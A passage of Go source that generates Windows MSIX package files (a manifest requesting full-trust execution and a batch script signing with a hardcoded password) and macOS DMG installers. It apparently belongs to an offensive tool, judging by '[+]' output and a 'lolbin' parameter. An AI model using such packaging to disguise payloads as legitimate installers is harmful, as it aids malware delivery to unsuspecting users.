	if idx := strings.Index(publisherDN, "CN="); idx >= 0 {
		rest := publisherDN[idx+3:]
		if ci := strings.Index(rest, ","); ci >= 0 {
			publisherShort = rest[:ci]
		} else {
			publisherShort = rest
		}
	}

	manifest := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<Package
    xmlns="http://schemas.microsoft.com/appx/manifest/foundation/windows10"
    xmlns:uap="http://schemas.microsoft.com/appx/manifest/uap/windows10"
    xmlns:rescap="http://schemas.microsoft.com/appx/manifest/foundation/windows10/restrictedcapabilities"
    IgnorableNamespaces="uap rescap">

  <Identity
      Name="%s"
      Publisher="%s"
      Version="%s"
      ProcessorArchitecture="%s" />

  <Properties>
    <DisplayName>%s</DisplayName>
    <PublisherDisplayName>%s</PublisherDisplayName>
    <Logo>assets\logo.png</Logo>
    <Description>%s</Description>
  </Properties>

  <Dependencies>
    <TargetDeviceFamily Name="Windows.Desktop" MinVersion="10.0.17763.0" MaxVersionTested="10.0.19041.0" />
  </Dependencies>

  <Resources>
    <Resource Language="en-us" />
  </Resources>

  <Applications>
    <Application Id="App" Executable="assets\%s" EntryPoint="Windows.FullTrustApplication">
      <uap:VisualElements
          DisplayName="%s"
          Description="%s"
          BackgroundColor="transparent"
          Square150x150Logo="assets\logo.png"
          Square44x44Logo="assets\logo.png" />
    </Application>
  </Applications>

  <Capabilities>
    <rescap:Capability Name="runFullTrust" />
  </Capabilities>

</Package>`, packageName, publisherDN, version, arch,
		displayName, publisherShort, description,
		entryExe, displayName, description)

	os.WriteFile(filepath.Join(outDir, "AppxManifest.xml"), []byte(manifest), 0644)

	contentTypes := `<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="exe"  ContentType="application/octet-stream"/>
  <Default Extension="dll"  ContentType="application/octet-stream"/>
  <Default Extension="xml"  ContentType="application/xml"/>
  <Default Extension="png"  ContentType="image/png"/>
  <Override PartName="/AppxManifest.xml" ContentType="application/vnd.ms-appx.manifest+xml"/>
  <Override PartName="/AppxBlockMap.xml" ContentType="application/vnd.ms-appx.blockmap+xml"/>
</Types>`
	os.WriteFile(filepath.Join(outDir, "[Content_Types].xml"), []byte(contentTypes), 0644)

	bat := fmt.Sprintf("@echo off\r\nREM Run on Windows with Windows SDK.\r\nSET MAKEAPPX=\"C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.19041.0\\x64\\makeappx.exe\"\r\nSET SIGNTOOL=\"C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.19041.0\\x64\\signtool.exe\"\r\nSET PFX_PATH=cert.pfx\r\nSET PFX_PASS=password\r\n\r\n%%MAKEAPPX%% pack /d . /p package.msix /o\r\n%%SIGNTOOL%% sign /fd SHA256 /a /f %%PFX_PATH%% /p %%PFX_PASS%% package.msix\r\necho MSIX built and signed: package.msix\r\n")
	os.WriteFile(filepath.Join(outDir, "build_msix.bat"), []byte(bat), 0644)

	fmt.Println("[+] MSIX package structure created: " + outDir)
	return outDir
}

// GenerateDMGProject creates a DMG build project wrapping an existing .app bundle.
// On macOS with hdiutil, assembles a real DMG. Otherwise emits a build script.
func GenerateDMGProject(appBundlePath, outDir, dmgName, volumeName string) string {
	if dmgName == "" {
		dmgName = "Install.dmg"
	}
	if volumeName == "" {
		volumeName = "Installer"
	}
	os.MkdirAll(outDir, 0755)

	_, err := exec.LookPath("hdiutil")
	if err != nil {
		appBase := filepath.Base(appBundlePath)
		buildScript := fmt.Sprintf("#!/bin/zsh\n# Run on macOS to wrap the .app into a DMG.\nset -euo pipefail\nSCRIPT_DIR=\"$(cd \"$(dirname \"$0\")\" && pwd)\"\nhdiutil create -quiet \\\n    -volname \"%s\" \\\n    -srcfolder \"$SCRIPT_DIR/%s\" \\\n    -ov -format UDZO \\\n    \"$SCRIPT_DIR/%s\"\necho \"[+] DMG created: $SCRIPT_DIR/%s\"\n", volumeName, appBase, dmgName, dmgName)

		buildPath := filepath.Join(outDir, "build_dmg.sh")
		if err := os.WriteFile(buildPath, []byte(buildScript), 0755); err != nil {
			log.Fatalf("Error writing DMG build script: %s", err)
		}
		fmt.Printf("[+] hdiutil not available. DMG build script: %s\n", buildPath)
		return buildPath
	}

	dmgPath := filepath.Join(outDir, dmgName)
	cmd := exec.Command("hdiutil", "create",
		"-quiet", "-volname", volumeName,
		"-srcfolder", appBundlePath,
		"-ov", "-format", "UDZO", dmgPath)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		log.Printf("hdiutil failed: %s\n%s", err, stderr.String())
		return ""
	}

	fmt.Println("[+] DMG created: " + dmgPath)
	return dmgPath
}

func GatherOutputFiles(mode, name, outFile, lolbin string) []string {
	candidates := OutputFilesForMode(mode, name, outFile, lolbin)
	var found []string
	for _, c := range candidates {
		if _, err := os.Stat(c); err == nil {
			found = append(found, c)
		}
	}
	return found
}
